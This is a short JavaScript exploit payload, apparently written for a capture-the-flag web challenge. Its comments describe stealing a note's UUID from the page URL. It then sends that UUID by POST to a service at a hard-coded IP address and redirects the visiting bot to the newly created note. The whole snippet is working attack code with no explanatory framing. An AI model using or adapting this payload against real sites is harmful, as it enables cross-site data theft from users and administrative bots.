(async () => {

    // STEAL NOTE A UUID
    let myUUID = new URL(location.href).searchParams.get("id");

    // CREATE NOTE B WITH STOLEN UUID INSIDE CONTENT
    let res = await fetch("http://35.240.202.177:7305/create", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            title: "leak",
            content: myUUID    // store A's ID inside B
        })
    });

    let j = await res.json();

    // j.data.id = UUID of Note B
    let noteB = j.data.id;

    // FORCE BOT TO VIEW Note B
    location = "http://35.240.202.177:7305/get?id=" + noteB;

})();
